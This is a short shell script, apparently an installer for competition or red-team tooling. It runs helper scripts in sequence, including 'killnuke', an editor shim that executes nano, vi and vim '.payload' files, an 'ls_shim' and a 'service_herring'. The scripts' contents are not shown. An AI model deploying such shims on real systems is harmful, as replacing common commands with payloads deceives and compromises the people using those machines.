../dependencies.sh
echo Installed dependencies

# Basic stuff
cd ../basic
./basic-stuff.sh
echo Installed basic stuff

# Killnuke
cd killnuke
./killnuke.sh
echo Installed killnuke

# Editor_shim
cd ../../editor_shim
./build.sh
./nano.payload
./vi.payload
./vim.payload
echo Installed editor_shim

# ls_shim
cd ../ls_shim
./install.sh
echo Installed ls_shim

# service_herring
cd ../service_herring
./install.sh
echo Installed service_herring